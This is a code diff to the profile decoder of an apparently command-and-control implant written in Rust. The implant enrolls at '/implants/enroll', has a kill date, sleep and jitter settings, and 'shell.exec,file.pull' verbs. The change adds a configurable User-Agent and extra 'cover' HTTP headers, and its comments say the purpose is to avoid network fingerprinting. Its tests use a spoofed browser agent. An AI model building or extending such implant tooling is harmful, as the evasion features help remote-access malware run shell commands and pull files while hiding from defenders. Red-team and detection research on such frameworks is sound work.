@@ -1,10 +1,11 @@
 use serde_json::Value;
 
 // The baked profile (the language-neutral wire contract, architecture.md
-// Sec 6): base64url JSON with the keys every build unit emits. The bake is
-// authoritative in a fielded artifact; an empty profile (the checked-in stub
-// or a dev build) falls back to ROD_* environment variables -- the documented
-// dev shape, unbaked and driven from the environment.
+// Sec 6): the profile file's JSON document, staged by every build unit as
+// the same bytes and embedded at compile time. The bake is authoritative in
+// a fielded artifact; an empty profile (the checked-in stub or a dev build)
+// falls back to ROD_* environment variables -- the documented dev shape,
+// unbaked and driven from the environment.
 
 /// The enroll route every front serves; the bake may override the path.
 const DEFAULT_ENROLL_PATH: &str = "/implants/enroll";
@@ -24,6 +25,14 @@ pub struct Profile {
     pub jitter_seconds: f64,
     pub mode: String,
     pub enroll_path: String,
+    /// The User-Agent presented on the web dials. Empty presents no
+    /// identifying default of the HTTP stack either -- a bare library
+    /// string is a fingerprint no baked profile asked for.
+    pub user_agent: String,
+    /// The extra HTTP headers applied to the web requests (enroll and
+    /// contacts alike), ordered as the bake sorted them. An entry named
+    /// "User-Agent" overrides `user_agent` above.
+    pub headers: Vec<(String, String)>,
     pub request_timeout_seconds: f64,
     pub envelope: String,
     pub contact_envelope: String,
@@ -48,23 +57,15 @@ fn field<'a>(map: &'a Value, key: &str) -> Option<&'a str> {
     map.get(key).and_then(Value::as_str)
 }
 
-fn base64url_decode(text: &str) -> Option<Vec<u8>> {
-    use base64::Engine;
-    base64::engine::general_purpose::URL_SAFE_NO_PAD
-        .decode(text.trim())
-        .ok()
-}
-
 impl Profile {
-    /// Decodes the baked profile; a malformed bake is refused loudly (a
-    /// fielded artifact whose bake will not parse must not run from stale
-    /// environment guesses).
+    /// Decodes the baked profile (the profile file's JSON document); a
+    /// malformed bake is refused loudly (a fielded artifact whose bake will
+    /// not parse must not run from stale environment guesses).
     pub fn from_baked(baked: &str) -> Option<Profile> {
-        if baked.is_empty() {
+        if baked.trim().is_empty() {
             return None;
         }
-        let raw = base64url_decode(baked)?;
-        let map: Value = serde_json::from_slice(&raw).ok()?;
+        let map: Value = serde_json::from_str(baked).ok()?;
         Some(Profile {
             enroll_url: field(&map, "enrollURL")?.to_string(),
             fallback_enroll_urls: map
@@ -89,6 +90,22 @@ impl Profile {
             enroll_path: field(&map, "enrollPath")
                 .unwrap_or(DEFAULT_ENROLL_PATH)
                 .to_string(),
+            user_agent: field(&map, "userAgent").unwrap_or("").to_string(),
+            // The bake renders the headers as a sorted JSON object; the
+            // decode keeps that order, so the applied request headers are
+            // stable byte-for-byte across builds.
+            headers: map
+                .get("headers")
+                .and_then(Value::as_object)
+                .map(|object| {
+                    object
+                        .iter()
+                        .filter_map(|(name, value)| {
+                            value.as_str().map(|v| (name.clone(), v.to_string()))
+                        })
+                        .collect()
+                })
+                .unwrap_or_default(),
             request_timeout_seconds: parse_duration(field(&map, "requestTimeout").unwrap_or("30s")),
             envelope: field(&map, "envelope").unwrap_or("aesgcm").to_string(),
             contact_envelope: field(&map, "contactEnvelope").unwrap_or("none").to_string(),
@@ -129,6 +146,8 @@ impl Profile {
             ),
             mode: std::env::var("ROD_MODE").unwrap_or_else(|_| "poll".into()),
             enroll_path: DEFAULT_ENROLL_PATH.into(),
+            user_agent: String::new(),
+            headers: Vec::new(),
             request_timeout_seconds: 30.0,
             envelope: std::env::var("ROD_ENVELOPE").unwrap_or_else(|_| "none".into()),
             contact_envelope: if envelope_key.is_empty() {
@@ -260,8 +279,7 @@ mod tests {
     use super::*;
 
     fn bake(json: &str) -> String {
-        use base64::Engine;
-        base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(json)
+        json.to_string()
     }
 
     fn minimal() -> Profile {
@@ -275,6 +293,8 @@ mod tests {
             jitter_seconds: 10.0,
             mode: "poll".into(),
             enroll_path: DEFAULT_ENROLL_PATH.into(),
+            user_agent: String::new(),
+            headers: Vec::new(),
             request_timeout_seconds: 30.0,
             envelope: "aesgcm".into(),
             contact_envelope: "none".into(),
@@ -289,7 +309,7 @@ mod tests {
     #[test]
     fn the_full_bake_reads_every_contract_key() {
         let baked = bake(
-            r#"{"enrollURL":"https://front.example/old","fallbackEnrollURLs":["https://two.example"],"caCert":"PEM","tlsTrust":"public","killDate":"2099-01-01T00:00:00Z","sleep":"45s","jitter":"5s","mode":"stream","enrollPath":"/x","requestTimeout":"15s","envelope":"aesgcm","contactEnvelope":"aesgcm","envelopeKey":"AA","token":"t","verbs":"shell.exec,file.pull"}"#,
+            r#"{"enrollURL":"https://front.example/old","fallbackEnrollURLs":["https://two.example"],"caCert":"PEM","tlsTrust":"public","killDate":"2099-01-01T00:00:00Z","sleep":"45s","jitter":"5s","mode":"stream","enrollPath":"/x","userAgent":"Mozilla/5.0 (rod)","headers":{"Accept":"text/html","X-Cover":"v"},"requestTimeout":"15s","envelope":"aesgcm","contactEnvelope":"aesgcm","envelopeKey":"AA","token":"t","verbs":"shell.exec,file.pull"}"#,
         );
         let profile = Profile::from_baked(&baked).expect("the bake parses");
         assert_eq!(profile.enroll_url, "https://front.example/old");
@@ -306,6 +326,14 @@ mod tests {
         assert_eq!(profile.request_timeout_seconds, 15.0);
         assert_eq!(profile.mode, "stream");
         assert_eq!(profile.enroll_path, "/x");
+        assert_eq!(profile.user_agent, "Mozilla/5.0 (rod)");
+        assert_eq!(
+            profile.headers,
+            vec![
+                ("Accept".to_string(), "text/html".to_string()),
+                ("X-Cover".to_string(), "v".to_string()),
+            ]
+        );
         assert_eq!(profile.contact_envelope, "aesgcm");
         assert_eq!(
             profile.verbs,
